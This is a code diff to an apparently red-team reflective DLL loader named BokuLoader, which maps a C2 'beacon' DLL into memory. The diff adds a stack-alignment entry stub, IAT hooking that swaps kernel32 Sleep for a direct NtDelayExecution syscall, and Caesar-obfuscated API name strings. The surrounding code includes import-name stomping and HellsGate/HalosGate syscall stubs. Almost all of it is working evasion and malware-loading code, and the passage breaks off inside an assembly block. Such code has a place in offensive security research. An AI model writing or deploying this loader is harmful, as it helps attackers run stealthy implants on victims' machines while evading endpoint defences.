@@ -1,5 +1,21 @@
 #include "BokuLoader.h"
 
+// align stack so we don't end up crashing later with MMX registers
+__asm__(
+"Setup:\n"              
+"    push rsi\n"         // Save rsi to the stack
+"    mov  rsi, rsp\n"    // Set rsi to the current stack pointer
+"    and  rsp, 0x0FFFFFFFFFFFFFFF0\n"    // Align the stack to a 16-byte boundary
+"    sub  rsp, 0x20\n"   // Allocate 32 bytes of space on the stack
+"    call BokuLoader\n"
+"    mov  rsp, rsi\n"    // Restore the stack pointer
+"    pop  rsi\n"         // Restore the original value of rsi
+"    pop  rcx \n"        // put ret address in rcx
+"    add  rsp, 0x20\n"   // remove 32 bytes of space on the stack
+"    and  rsp, 0x0FFFFFFFFFFFFFFF0\n"    // Align the stack to a 16-byte boundary
+"    jmp  rcx \n"
+);
+
 void * BokuLoader()
 {
     APIS   api;
@@ -162,30 +178,30 @@ void doSections(Dll * virtual_beacon_dll, Dll * raw_beacon_dll){
     while( numberOfSections-- )
     {
         __asm__(
-            "add rax, 0xC \n"   // offsetof(IMAGE_SECTION_HEADER, VirtualAddress)
-            "xor rcx, rcx \n"
+            "add rax, 0xC   \n"   // offsetof(IMAGE_SECTION_HEADER, VirtualAddress)
+            "xor rcx, rcx   \n"
             "mov ecx, [rax] \n"
-            "xchg rax, rcx \n"
-            : "=r" (section.RVA)        // RAX OUT
+            "xchg rax, rcx  \n"
+            : "=r" (section.RVA)               // RAX OUT
             : "r" (raw_beacon_dll->NthSection) // RAX IN
         );
         section.dst_rdll_VA = add(virtual_beacon_dll->dllBase, section.RVA);
         __asm__(
-            "add rax, 0x14 \n"  // offsetof(IMAGE_SECTION_HEADER, PointerToRawData)
-            "xor rcx, rcx \n"
+            "add rax, 0x14  \n"  // offsetof(IMAGE_SECTION_HEADER, PointerToRawData)
+            "xor rcx, rcx   \n"
             "mov ecx, [rax] \n"
-            "xchg rax, rcx \n"
-            : "=r" (section.PointerToRawData) // RAX OUT
-            : "r" (raw_beacon_dll->NthSection)       // RAX IN
+            "xchg rax, rcx  \n"
+            : "=r" (section.PointerToRawData)  // RAX OUT
+            : "r" (raw_beacon_dll->NthSection) // RAX IN
         );
         section.src_rdll_VA = add(raw_beacon_dll->dllBase, section.PointerToRawData);
         __asm__(
-            "add rax, 0x10 \n"  // offsetof(IMAGE_SECTION_HEADER, SizeOfRawData)
-            "xor rcx, rcx \n"
+            "add rax, 0x10  \n"  // offsetof(IMAGE_SECTION_HEADER, SizeOfRawData)
+            "xor rcx, rcx   \n"
             "mov ecx, [rax] \n"
-            "xchg rax, rcx \n"
-            : "=r" (section.SizeOfSection) // RAX OUT
-            : "r" (raw_beacon_dll->NthSection)    // RAX IN
+            "xchg rax, rcx  \n"
+            : "=r" (section.SizeOfSection)     // RAX OUT
+            : "r" (raw_beacon_dll->NthSection) // RAX IN
         );
         // check if this is the .text section
         if (textSectionFlag == FALSE)
@@ -211,10 +227,19 @@ void doImportTable(APIS * api, Dll * virtual_beacon_dll, Dll * raw_beacon_dll){
     PIMAGE_OPTIONAL_HEADER64 raw_beacon_dll_OPTIONAL_HEADER = NULL;
     PIMAGE_DATA_DIRECTORY    raw_beacon_dll_data_directory  = NULL;
     char * importName = NULL;
+    void* slphook     = NULL;
     DWORD    ImportDirectory_RVA       = 0;
     DWORD    ImportDirectory_Size      = 0;
     Dll dll_import;
-    RtlSecureZeroMemory(&dll_import,sizeof(Dll));
+    
+    // This is IAT hooking functionality support added to this public project
+    // Currently this is just a poc stub. As it exists atm, this is an unsupported non-default feature 
+    // Currently only demo sleep hook exists which uses NtDelayExecution direct syscall rather than k32.Sleep->kb.SleepEx->nt.NtDelayExecution
+    // To enable IAT Hooking change this value to the number of hooks
+    // Making this value larger than defined hooks will still work, but it will slow down IAT resolution
+    // Enabling the sleephook should have sleepmask set to "false" in C2 profile
+    unsigned int hooks = 0;
+    //unsigned int hooks = 1;
      
     // Get the Image base by walking the headers
     raw_beacon_dll_DOS_HEADER       = (PIMAGE_DOS_HEADER)raw_beacon_dll->dllBase;
@@ -231,11 +256,11 @@ void doImportTable(APIS * api, Dll * virtual_beacon_dll, Dll * raw_beacon_dll){
     nImportDesc = ImportDirectory;
     
     __asm__(
-        "xor rcx, rcx \n"
-        "add rdx, 0xC \n"   // 12 (0xC) byte offset is the address of the Name RVA within the image import descriptor for the DLL we are importing
-        "mov ecx, [rdx] \n" // Move the 4 byte unsigned long of IMAGE_IMPORT_DESCRIPTOR->Name into Ecx
-        "mov rdx, rcx \n"
-        "add rax, rdx \n"        // Address of Module String = dllBase + ((PIMAGE_IMPORT_DESCRIPTOR)nextModuleImportDescriptor)->Name
+        "xor rcx, rcx   \n"
+        "add rdx, 0xC   \n"  // 12 (0xC) byte offset is the address of the Name RVA within the image import descriptor for the DLL we are importing
+        "mov ecx, [rdx] \n"  // Move the 4 byte unsigned long of IMAGE_IMPORT_DESCRIPTOR->Name into Ecx
+        "mov rdx, rcx   \n"
+        "add rax, rdx   \n"       // Address of Module String = dllBase + ((PIMAGE_IMPORT_DESCRIPTOR)nextModuleImportDescriptor)->Name
         : "=r" (importNameRVA),   // RDX OUT
           "=r" (importName)       // RAX OUT
         : "r" (virtual_beacon_dll->dllBase), // RAX IN
@@ -244,29 +269,28 @@ void doImportTable(APIS * api, Dll * virtual_beacon_dll, Dll * raw_beacon_dll){
     // The last entry in the image import directory is all zeros
     while(importNameRVA)
     {
-        len_importName       = (unsigned __int64)StringLengthA(importName);
+        RtlSecureZeroMemory(&dll_import,sizeof(Dll));
+        len_importName  = (unsigned __int64)StringLengthA(importName);
         if(raw_beacon_dll->xor_key){
             xorc(len_importName, importName, raw_beacon_dll->xor_key);
-            dll_import.dllBase   = xLoadLibrary(importName); 
-        }else{
-            dll_import.dllBase   = xLoadLibrary(importName); 
         }
+        dll_import.dllBase   = xLoadLibrary(importName); 
         stomp(len_importName, importName); // 0 out import DLL name in virtual beacon dll
         __asm__(
-            "xor rcx, rcx \n"   // importLookupTableEntry = VA of the OriginalFirstThunk
-            "mov ecx, [rax] \n" // Move the 4 byte unsigned long of IMAGE_IMPORT_DESCRIPTOR->OriginalFirstThunk into Ecx
-            "add rcx, rdx \n"   // importLookupTableEntry = dllBase + ((PIMAGE_IMPORT_DESCRIPTOR)nextModuleImportDescriptor)->OriginalFirstThunk
-            "xchg rax, rcx \n"
+            "xor rcx, rcx   \n"   // importLookupTableEntry = VA of the OriginalFirstThunk
+            "mov ecx, [rax] \n"   // Move the 4 byte unsigned long of IMAGE_IMPORT_DESCRIPTOR->OriginalFirstThunk into Ecx
+            "add rcx, rdx   \n"   // importLookupTableEntry = dllBase + ((PIMAGE_IMPORT_DESCRIPTOR)nextModuleImportDescriptor)->OriginalFirstThunk
+            "xchg rax, rcx  \n"
             : "=r" (LookupTableEntry) // RAX OUT
             : "r" (nImportDesc),      // RAX IN        
               "r" (virtual_beacon_dll->dllBase)  // RDX IN
         );
         __asm__(
-            "xor rcx, rcx \n"   // importAddressTableEntry = VA of the IAT (via first thunk not origionalfirstthunk)
-            "add rax, 0x10 \n"  // 16 (0x10) byte offset is the address of the unsigned long FirstThunk within the image import descriptor
-            "mov ecx, [rax] \n" // Move the 4 byte unsigned long of IMAGE_IMPORT_DESCRIPTOR->FirstThunk into Ecx
-            "add rcx, rdx \n"   // importAddressTableEntry = dllBase + ((PIMAGE_IMPORT_DESCRIPTOR)nextModuleImportDescriptor)->FirstThunk
-            "xchg rax, rcx \n"
+            "xor rcx, rcx   \n"   // importAddressTableEntry = VA of the IAT (via first thunk not origionalfirstthunk)
+            "add rax, 0x10  \n"   // 16 (0x10) byte offset is the address of the unsigned long FirstThunk within the image import descriptor
+            "mov ecx, [rax] \n"   // Move the 4 byte unsigned long of IMAGE_IMPORT_DESCRIPTOR->FirstThunk into Ecx
+            "add rcx, rdx   \n"   // importAddressTableEntry = dllBase + ((PIMAGE_IMPORT_DESCRIPTOR)nextModuleImportDescriptor)->FirstThunk
+            "xchg rax, rcx  \n"
             : "=r" (AddressTableEntry) // RAX OUT
             : "r" (nImportDesc),       // RAX IN
               "r" (virtual_beacon_dll->dllBase)   // RDX IN
@@ -279,19 +303,20 @@ void doImportTable(APIS * api, Dll * virtual_beacon_dll, Dll * raw_beacon_dll){
         while(nullCheck)
         {
             parseDLL(&dll_import);
+            EntryAddress = NULL;
 
             if( LookupTableEntry && ((PIMAGE_THUNK_DATA)LookupTableEntry)->u1.Ordinal & IMAGE_ORDINAL_FLAG )
             {
                 __asm__( // Export Base Ordinal from the Export Directory of the module/dll being imported (0x10 offset)
-                    "xor rdx, rdx \n"   // located in the Export Directory in memory of the module which functions/api's are being imported
-                    "add rax, 0x10 \n"  // unsigned long Base; // 0x10 offset // RCX = &importedDllBaseOrdinal
+                    "xor rdx, rdx   \n" // located in the Export Directory in memory of the module which functions/api's are being imported
+                    "add rax, 0x10  \n" // unsigned long Base; // 0x10 offset // RCX = &importedDllBaseOrdinal
                     "mov edx, [rax] \n" // RAX = importedDllBaseOrdinal (Value/unsigned long)
-                    "xchg rax, rdx \n"
+                    "xchg rax, rdx  \n"
                     : "=r" (BaseOrdinal)                // RAX OUT
                     : "r" (dll_import.Export.Directory) // RAX IN
                 );
                 __asm__( // Import Hint from the modules Hint/Name table
-                    "mov rax, [rax] \n"  // RAX = 8000000000000013. 13 is the original Thunk, now we need to get rid of the 8
+                    "mov rax, [rax]  \n" // RAX = 8000000000000013. 13 is the original Thunk, now we need to get rid of the 8
                     "and eax, 0xFFFF \n" // get rid of the 8
                     : "=r" (importEntryHint) // RAX OUT
                     : "r" (LookupTableEntry) // RAX IN
@@ -303,15 +328,15 @@ void doImportTable(APIS * api, Dll * virtual_beacon_dll, Dll * raw_beacon_dll){
                       "r" (BaseOrdinal)      // RDX IN
                 );
                 __asm__( // The ExportAddressTable/AddressOfFunctions holds unsigned long (4 byte) RVA's for the executable functions/api's address
-                    "mov r11, rdx \n"
-                    "xor r9, r9 \n"
-                    "add r9b, 0x4 \n"    // sizeof(unsigned long) - This is because each entry in the table is a 4 byte unsigned long which is the RVA/offset for the actual executable functions address
-                    "mul r9 \n"        // importEntryExportTableIndex * sizeof(unsigned long)
-                    "add rax, r11 \n"   // RVA for our functions address
-                    "xor r10, r10 \n"
+                    "mov r11, rdx    \n"
+                    "xor r9, r9      \n"
+                    "add r9b, 0x4    \n" // sizeof(unsigned long) - This is because each entry in the table is a 4 byte unsigned long which is the RVA/offset for the actual executable functions address
+                    "mul r9          \n" // importEntryExportTableIndex * sizeof(unsigned long)
+                    "add rax, r11    \n" // RVA for our functions address
+                    "xor r10, r10    \n"
                     "mov r10d, [rax] \n" // The RVA for the executable function we are importing
-                    "add rcx, r10 \n"   // The executable address within the imported DLL for the function we imported
-                    "xchg rax, rcx \n"
+                    "add rcx, r10    \n" // The executable address within the imported DLL for the function we imported
+                    "xchg rax, rcx   \n"
                     : "=r" (EntryAddress)                  // RAX OUT
                     : "r"(TableIndex),                     // RAX IN - importEntryExportTableIndex
                       "r"(dll_import.Export.AddressTable), // RDX IN - AddressTable
@@ -329,8 +354,8 @@ void doImportTable(APIS * api, Dll * virtual_beacon_dll, Dll * raw_beacon_dll){
             {
                 __asm__( // If there was no ordinal/hint to import then import via the name from the import tables Hint/Name Table for the imported module
                     "mov rax, [rax] \n" // RVA for our functions Name/Hint table entry
-                    "add rax, rdx \n"   // VA (Address in memory) Name/Hint Entry = RVA Name/Hint Entry + New RDLL Address
-                    "add rax, 0x2 \n"   // The hint is the first 2 bytes, then its followed by the name string for our import. We need to drop the first 2 bytes so we just have the name string
+                    "add rax, rdx   \n" // VA (Address in memory) Name/Hint Entry = RVA Name/Hint Entry + New RDLL Address
+                    "add rax, 0x2   \n" // The hint is the first 2 bytes, then its followed by the name string for our import. We need to drop the first 2 bytes so we just have the name string
                     : "=r" (EntryName)         // RAX OUT
                     : "r" (AddressTableEntry), // RAX IN, import table entry we are going to overwrite / The RVA for our functions Name/Hint Table entry
                       "r" (virtual_beacon_dll->dllBase)   // RDX IN
@@ -339,8 +364,14 @@ void doImportTable(APIS * api, Dll * virtual_beacon_dll, Dll * raw_beacon_dll){
                 len_EntryName = (unsigned __int64)StringLengthA(EntryName);
                 if(raw_beacon_dll->xor_key){
                     xorc(len_EntryName, EntryName, raw_beacon_dll->xor_key);
-                    EntryAddress = xGetProcAddress(EntryName, &dll_import);
-                }else{
+                }
+                if (hooks){
+                    EntryAddress = check_and_write_IAT_Hook(EntryName, virtual_beacon_dll, raw_beacon_dll);
+                }
+                if (EntryAddress){
+                    hooks--;
+                }
+                if (EntryAddress == NULL){
                     EntryAddress = xGetProcAddress(EntryName, &dll_import);
                 }
                 stomp(len_EntryName, EntryName); // 0 out import entry name in virtual beacon dll
@@ -362,11 +393,11 @@ void doImportTable(APIS * api, Dll * virtual_beacon_dll, Dll * raw_beacon_dll){
         }
         nImportDesc += 0x14; // 0x14 = 20 = sizeof( IMAGE_IMPORT_DESCRIPTOR )
         __asm__( // Do this again for the next module/DLL in the Import Directory
-            "xor rcx, rcx \n"
-            "add rax, 0xC  \n"  // 12(0xC) byte offset is the address of the Name RVA within the image import descriptor for the DLL we are importing
-            "mov ecx, [rax] \n" // Move the 4 byte unsigned long of IMAGE_IMPORT_DESCRIPTOR->Name
-            "mov rax, rcx \n"   // RVA of Name DLL
-            "add rdx, rax \n"   // Address of Module String = newRdllAddr + ((PIMAGE_IMPORT_DESCRIPTOR)nextModuleImportDescriptor)->Name
+            "xor rcx, rcx   \n"
+            "add rax, 0xC   \n"  // 12(0xC) byte offset is the address of the Name RVA within the image import descriptor for the DLL we are importing
+            "mov ecx, [rax] \n"  // Move the 4 byte unsigned long of IMAGE_IMPORT_DESCRIPTOR->Name
+            "mov rax, rcx   \n"  // RVA of Name DLL
+            "add rdx, rax   \n"  // Address of Module String = newRdllAddr + ((PIMAGE_IMPORT_DESCRIPTOR)nextModuleImportDescriptor)->Name
             : "=r" (importName),     // RDX OUT
               "=r" (importNameRVA)   // RAX OUT
             : "r" (nImportDesc),     // RAX IN
@@ -374,6 +405,19 @@ void doImportTable(APIS * api, Dll * virtual_beacon_dll, Dll * raw_beacon_dll){
         );
     }
 }
+
+void* check_and_write_IAT_Hook(char* EntryName, Dll * virtual_beacon_dll, Dll * raw_beacon_dll){
+    // Hook Kernel32.Sleep
+    // Enabling the sleephook should have sleepmask set to "false" in C2 profile
+    unsigned char str_Sleep[] = {0x73,0x8c,0x85,0x85,0x90,0x00};
+    basicCaesar_Decrypt(5,str_Sleep,32);
+    if(StringCompareA(EntryName,str_Sleep)){ 
+        return get_virtual_Hook_address(raw_beacon_dll, virtual_beacon_dll, Sleep_Hook);
+    }
+    // failed to find a matching hook. Return NULL which will default to xGetProcAddress
+    return NULL;
+}
+
 void doRelocations(APIS * api, Dll * virtual_beacon_dll, Dll * raw_beacon_dll){
     unsigned __int64 beacon_image_base    = 0;
     unsigned __int64 BaseAddressDelta     = 0;
@@ -435,14 +479,14 @@ void doRelocations(APIS * api, Dll * virtual_beacon_dll, Dll * raw_beacon_dll){
                 "mov rax, r9    \n"
                 "shr r9, 0x0C   \n"    // Check the 4 bit type
                 "cmp r9b, 0x0A  \n"   // IMAGE_REL_BASED_DIR64?
-                "jne badtype    \n"
+              "jne badtype    \n"
                 "shl rax, 0x34  \n"   // only keep the last 12 bits of RAX by shaking the RAX register
                 "shr rax, 0x34  \n"   // the last 12 bits is the offset, the first 4 bits is the type
                 "add rdx, rax   \n"    // in memory Virtual Address of our current relocation entry
                 "mov r10, [rdx] \n"  // value of the relocation entry
                 "add r10, rcx   \n"    // value of our relocation entry + the hardcoded Addr:Our Real in memory VA delta we calculated earlier
                 "mov [rdx], r10 \n"  // WRITE THAT RELOC!
-                "badtype:\n"
+              "badtype:\n"
                 : // no outputs
                 : "r" (this_relocation),     // RAX IN
                   "r" (this_relocation_VA),  // RDX IN
@@ -453,6 +497,47 @@ void doRelocations(APIS * api, Dll * virtual_beacon_dll, Dll * raw_beacon_dll){
         // Now move to the next Base Relocation Block and resolve all of the relocation entries
         this_BaseRelocation = ((char*)this_BaseRelocation + this_BaseRelocation->SizeOfBlock);
     }
+}
+
+/*
+// void* getHook(void* src_rdll.BaseAddr, void* src_rdll.hookAddr, void* dst_rdll.BaseAddr, int raw_vs_virtual_text_section_diff);
+//                            RCX                      RDX                      R8                        R9
+"getHook: \n"
+    "sub rdx, rcx \n"   // RDX = RVA hookAddr = (src_rdll.hookAddr - src_rdll.BaseAddr)
+    "add rdx, r8  \n"   // RDX = dst_rdll.hookAddr = (RVA hookAddr + dst_rdll.BaseAddr)
+    "mov rax, rdx \n"   // return dst_rdll.hookAddr
+    "add rax, r9  \n"   // raw_vs_virtual_text_section_diff
+    "ret \n"
+*/
+
+void* get_virtual_Hook_address(Dll * raw_beacon_dll, Dll * virtual_beacon_dll, void* raw_hook_address)
+{
+    unsigned int raw_vs_virtual_delta   = 0;
+    void* hook_raw_file_offset          = NULL;
+    void* hook_relative_virtual_offset  = NULL;
+    void* virtual_hook_address          = NULL;
+    unsigned short size_Optional_Header = 0;
+    PIMAGE_DOS_HEADER        raw_beacon_dll_DOS_HEADER      = NULL;
+    PIMAGE_FILE_HEADER       raw_beacon_dll_FILE_HEADER     = NULL;
+    PIMAGE_OPTIONAL_HEADER64 raw_beacon_dll_OPTIONAL_HEADER = NULL;
+    PIMAGE_SECTION_HEADER    raw_beacon_dll_SECTION_HEADER  = NULL;
+     
+    // Get the Section Header
+    raw_beacon_dll_DOS_HEADER       = (PIMAGE_DOS_HEADER)raw_beacon_dll->dllBase;
+    raw_beacon_dll_FILE_HEADER      = (PIMAGE_FILE_HEADER)(raw_beacon_dll_DOS_HEADER->e_lfanew + (char*)raw_beacon_dll_DOS_HEADER);
+    raw_beacon_dll_OPTIONAL_HEADER  = (PIMAGE_OPTIONAL_HEADER64)(0x18 + (char*)raw_beacon_dll_FILE_HEADER);
+    size_Optional_Header            = *(unsigned short*)((char*)raw_beacon_dll_FILE_HEADER + 0x14);
+    raw_beacon_dll_SECTION_HEADER   = (PIMAGE_SECTION_HEADER)add(raw_beacon_dll_OPTIONAL_HEADER, size_Optional_Header);
+
+    raw_vs_virtual_delta         = (unsigned int)(raw_beacon_dll_SECTION_HEADER->VirtualAddress - raw_beacon_dll_SECTION_HEADER->PointerToRawData);
+
+    hook_raw_file_offset         = (void*)((char*)raw_hook_address - (char*)raw_beacon_dll->dllBase);
+
+    hook_relative_virtual_offset = (void*)add(hook_raw_file_offset, raw_vs_virtual_delta);
+
+    virtual_hook_address         = (void*)add(hook_relative_virtual_offset, virtual_beacon_dll->dllBase);
+    
+    return virtual_hook_address;
 }
 
 void parseDLL(Dll * dll){
@@ -553,31 +638,31 @@ void getApis(APIS * api){
     
 }
 void * xLoadLibrary(void * library_name){
-        // Check if the DLL is already loaded and the entry exists in the PEBLdr
-        void* LibraryAddress = getDllBase(library_name);
-        // If the DLL is not already loaded into process memory, use LoadLibraryA to load the imported module into memory
-        if (LibraryAddress == NULL){
-            APIS api;
-            ANSI_STRING    ANSI_Library_Name;
-            UNICODE_STRING UNICODE_Library_Name;
+    // Check if the DLL is already loaded and the entry exists in the PEBLdr
+    void* LibraryAddress = getDllBase(library_name);
+    // If the DLL is not already loaded into process memory, use LoadLibraryA to load the imported module into memory
+    if (LibraryAddress == NULL){
+        APIS api;
+        ANSI_STRING    ANSI_Library_Name;
+        UNICODE_STRING UNICODE_Library_Name;
 
-            RtlSecureZeroMemory( &api,                  sizeof( APIS ) );
-            RtlSecureZeroMemory( &ANSI_Library_Name,    sizeof( ANSI_Library_Name ) );
-            RtlSecureZeroMemory( &UNICODE_Library_Name, sizeof( UNICODE_Library_Name ) );
+        RtlSecureZeroMemory( &api,                  sizeof( APIS ) );
+        RtlSecureZeroMemory( &ANSI_Library_Name,    sizeof( ANSI_Library_Name ) );
+        RtlSecureZeroMemory( &UNICODE_Library_Name, sizeof( UNICODE_Library_Name ) );
 
-            getApis(&api);
+        getApis(&api);
 
-            // Change ASCII string to ANSI struct string
-            api.RtlInitAnsiString(&ANSI_Library_Name,library_name);
-            // RtlAnsiStringToUnicodeString converts the given ANSI source string into a Unicode string.
-            // 3rd arg = True = routine should allocate the buffer space for the destination string. the caller must deallocate the buffer by calling RtlFreeUnicodeString.
-            api.RtlAnsiStringToUnicodeString( &UNICODE_Library_Name, &ANSI_Library_Name, TRUE );
+        // Change ASCII string to ANSI struct string
+        api.RtlInitAnsiString(&ANSI_Library_Name,library_name);
+        // RtlAnsiStringToUnicodeString converts the given ANSI source string into a Unicode string.
+        // 3rd arg = True = routine should allocate the buffer space for the destination string. the caller must deallocate the buffer by calling RtlFreeUnicodeString.
+        api.RtlAnsiStringToUnicodeString( &UNICODE_Library_Name, &ANSI_Library_Name, TRUE );
 
-            api.LdrLoadDll(NULL, 0,&UNICODE_Library_Name,&LibraryAddress);
-            // cleanup
-            api.RtlFreeUnicodeString( &UNICODE_Library_Name );
-        }
-        return LibraryAddress;
+        api.LdrLoadDll(NULL, 0,&UNICODE_Library_Name,&LibraryAddress);
+        // cleanup
+        api.RtlFreeUnicodeString( &UNICODE_Library_Name );
+    }
+    return LibraryAddress;
 }
 
 void * xGetProcAddress(void * symbolStr, Dll * dll) {
@@ -622,6 +707,16 @@ SIZE_T StringLengthA(LPCSTR String)
     return (String2 - String);
 }
 
+BOOL StringCompareA( LPCSTR String1, LPCSTR String2 ) {
+    for (; *String1 == *String2; String1++, String2++)
+    {
+        // if we hit the null byte terminator we are at the end of the string. They are equal
+        if (*String1 == '\0')
+            return TRUE;
+    }
+    return FALSE;
+}
+
 // Havoc C2 function
 SIZE_T CharStringToWCharString( PWCHAR Destination, PCHAR Source, SIZE_T MaximumAllowed )
 {
@@ -658,10 +753,31 @@ void stomp(unsigned __int64 length, unsigned char * buff) {
   }
 }
 
+void Sleep_Hook(DWORD dwMilliseconds){
+    Dll ntdll;
+    unsigned char s_ntdll[] = {0x82,0x68,0x58,0x80,0x60,0x42,0x58,0x80,0x80,0x00};
+    basicCaesar_Decrypt(9, s_ntdll, 513556);
+    ntdll.dllBase = getDllBase((char *)s_ntdll);
+    parseDLL(&ntdll);
+
+    char s_NtDelayExecution[] = {'N','t','D','e','l','a','y','E','x','e','c','u','t','i','o','n',0};
+    int  i_NtDelayExecution   = 16;
+
+    tNtDelayExecution pNtDelayExecution = (tNtDelayExecution) getSymbolAddress(s_NtDelayExecution, (void*)i_NtDelayExecution, ntdll.dllBase, ntdll.Export.AddressTable, ntdll.Export.NameTable, ntdll.Export.OrdinalTable,ntdll.Export.NumberOfNames);
+
+    LARGE_INTEGER    Time;
+    PLARGE_INTEGER   TimePtr;
+    TimePtr = &Time;
+    TimePtr->QuadPart = dwMilliseconds * -10000LL;
+    pNtDelayExecution(0, TimePtr);
+}
+
+
 __asm__(
 // "Registers RAX, RCX, RDX, R8, R9, R10, and R11 are considered volatile and must be considered destroyed on function calls."
 // "RBX, RBP, RDI, RSI, R12, R14, R14, and R15 must be saved in any function using them." 
 // -- https://www.intel.com/content/dam/develop/external/us/en/documents/introduction-to-x64-assembly-181178.pdf
+
 "getPEB: \n" 
     "mov rax, gs:[0x60] \n"         // ProcessEnvironmentBlock // GS = TEB
     "ret \n"
@@ -746,46 +862,46 @@ __asm__(
   "end: \n"
     "ret \n"                        // return to caller
 
-"getExportDirectory: \n"
-    "push rbx \n" // save the rbx register to the stack
-    "mov r8, rcx \n"
+"getExportDirectory:     \n"
+    "push rbx            \n" // save the rbx register to the stack
+    "mov r8, rcx         \n"
     "mov ebx, [rcx+0x3C] \n"
-    "add rbx, r8 \n"
-    "xor rax, rax \n"
+    "add rbx, r8         \n"
+    "xor rax, rax        \n"
     "mov eax, [rbx+0x88] \n"
-    "add rax, r8 \n"
+    "add rax, r8         \n"
     "pop rbx \n" // restore rbx from stack
     "ret \n" // return ExportDirectory;
 
 "getExportDirectorySize: \n"
-    "push rbx \n"
-    "mov r8, rcx \n"
+    "push rbx            \n"
+    "mov r8, rcx         \n"
     "mov ebx, [rcx+0x3C] \n"
-    "add rbx, r8 \n"
-    "xor rax, rax \n"
+    "add rbx, r8         \n"
+    "xor rax, rax        \n"
     "mov eax, [rbx+0x8c] \n"
-    "pop rbx \n"
+    "pop rbx             \n"
     "ret \n" // return ExportDirectory Size;
 
 "getExportAddressTable: \n"
-    "xor rax, rax \n"
-    "add rdx, 0x1C \n"              // unsigned long AddressOfFunctions; // 0x1C offset // RDX = &RVAExportAddressTable
-    "mov eax, [rdx] \n"             // RVAExportAddressTable (Value/RVA)
-    "add rax, rcx \n"               // VA ExportAddressTable (The address of the Export table in running memory of the process)
+    "xor rax, rax       \n"
+    "add rdx, 0x1C      \n"   // unsigned long AddressOfFunctions; // 0x1C offset // RDX = &RVAExportAddressTable
+    "mov eax, [rdx]     \n"   // RVAExportAddressTable (Value/RVA)
+    "add rax, rcx       \n"   // VA ExportAddressTable (The address of the Export table in running memory of the process)
     "ret \n" // return ExportAddressTable
 
-"getExportNameTable: \n"
-    "xor rax, rax \n"
-    "add rdx, 0x20 \n"              // unsigned long AddressOfFunctions; // 0x20 offset
-    "mov eax, [rdx] \n"             // RVAExportAddressOfNames (Value/RVA)
-    "add rax, rcx \n"               // VA ExportAddressOfNames
+"getExportNameTable:    \n"
+    "xor rax, rax       \n"
+    "add rdx, 0x20      \n"   // unsigned long AddressOfFunctions; // 0x20 offset
+    "mov eax, [rdx]     \n"   // RVAExportAddressOfNames (Value/RVA)
+    "add rax, rcx       \n"   // VA ExportAddressOfNames
     "ret \n" // return ExportNameTable;
 
 "getExportOrdinalTable: \n"
-    "xor rax, rax \n"
-    "add rdx, 0x24 \n"              // unsigned long AddressOfNameOrdinals; // 0x24 offset
-    "mov eax, [rdx] \n"             // RVAExportAddressOfNameOrdinals (Value/RVA)
-    "add rax, rcx \n"               // VA ExportAddressOfNameOrdinals
+    "xor rax, rax       \n"
+    "add rdx, 0x24      \n"   // unsigned long AddressOfNameOrdinals; // 0x24 offset
+    "mov eax, [rdx]     \n"   // RVAExportAddressOfNameOrdinals (Value/RVA)
+    "add rax, rcx       \n"   // VA ExportAddressOfNameOrdinals
     "ret \n" // return ExportOrdinalTable;
 
 "getNumberOfNames: \n"
@@ -973,86 +1089,89 @@ __asm__(
     "pop rdi \n"
     "ret \n"
 
-"halosGateUp: \n" // RAX,RSI,RDI,RDX
-    "push rdi \n"
-    "push rsi \n"
-    "xor rsi, rsi \n"
-    "xor rdi, rdi \n"
+"halosGateUp:          \n" // RAX,RSI,RDI,RDX
+    "push rdi          \n"
+    "push rsi          \n"
+    "xor rsi, rsi      \n"
+    "xor rdi, rdi      \n"
     "mov rsi, 0x00B8D18B4C \n"
-    "xor rax, rax \n"
-    "mov al, 0x20 \n"
-    "mul dx \n"
-    "add rcx, rax \n"
-    "mov edi, [rcx] \n"
-    "cmp rsi, rdi \n"
+    "xor rax, rax      \n"
+    "mov al, 0x20      \n"
+    "mul dx            \n"
+    "add rcx, rax      \n"
+    "mov edi, [rcx]    \n"
+    "cmp rsi, rdi      \n"
     "jne HalosGateFail \n"
-    "mov ax, [rcx+4] \n"
+    "mov ax, [rcx+4]   \n"
     "jmp HalosGateExit \n"
 
-"halosGateDown: \n" // RAX,RSI,RDI,RDX
-    "push rdi \n"
-    "push rsi \n"
-    "xor rsi, rsi \n"
-    "xor rdi, rdi \n"
+"halosGateDown:        \n" // RAX,RSI,RDI,RDX
+    "push rdi          \n"
+    "push rsi          \n"
+    "xor rsi, rsi      \n"
+    "xor rdi, rdi      \n"
     "mov rsi, 0x00B8D18B4C \n"
-    "xor rax, rax \n"
-    "mov al, 0x20 \n"
-    "mul dx \n"
-    "sub rcx, rax \n"
-    "mov edi, [rcx] \n"
-    "cmp rsi, rdi \n"
+    "xor rax, rax      \n"
+    "mov al, 0x20      \n"
+    "mul dx            \n"
+    "sub rcx, rax      \n"
+    "mov edi, [rcx]    \n"
+    "cmp rsi, rdi      \n"
     "jne HalosGateFail \n"
-    "mov ax, [rcx+4] \n"
-"HalosGateFail: \n"
-    "xor rax, rax \n" // return 0x0 if fail to find syscall stub bytes
-"HalosGateExit: \n"
-    "pop rsi \n"
-    "pop rdi \n"
-    "ret \n"
+    "mov ax, [rcx+4]   \n"
+"HalosGateFail:        \n"
+    "xor rax, rax      \n" // return 0x0 if fail to find syscall stub bytes
+"HalosGateExit:        \n"
+    "pop rsi           \n"
+    "pop rdi           \n"
+    "ret               \n"
 
-"HellsGate: \n"  // Loads the Syscall number into the R11 register before calling HellDescent()
-    "xor r11, r11 \n"
-    "mov r11d, ecx \n"  // Save Syscall Number in R11
-    "ret \n"
+"HellsGate:        \n"  // Loads the Syscall number into the R11 register before calling HellDescent()
+    "xor r11, r11  \n"
+    "mov r11d, ecx \n" // Save Syscall Number in R11
+    "ret           \n"
 
-"HellDescent: \n" // Called directly after HellsGate
-    "xor rax, rax \n"
-    "mov r10, rcx \n"
-    "mov eax, r11d \n"  // Move the Syscall Number into RAX before calling syscall interrupt
-    "syscall \n"
-    "ret \n"
+"HellDescent:      \n" // Called directly after HellsGate
+    "xor rax, rax  \n"
+    "mov r10, rcx  \n"
+    "mov eax, r11d \n" // Move the Syscall Number into RAX before calling syscall interrupt
+    "syscall       \n"
+    "ret           \n"
 
-"getFirstEntry: \n" // RAX, RCX
-    "mov rax, gs:[0x60] \n"         // ProcessEnvironmentBlock // GS = TEB
-    "mov rax, [rax+0x18] \n"        // _PEB_LDR_DATA
-    "mov rax, [rax+0x20] \n"        // InMemoryOrderModuleList - First Entry (probably the host PE File)
-    "ret \n"
+"getFirstEntry:          \n"  // RAX, RCX
+    "mov rax, gs:[0x60]  \n"  // ProcessEnvironmentBlock // GS = TEB
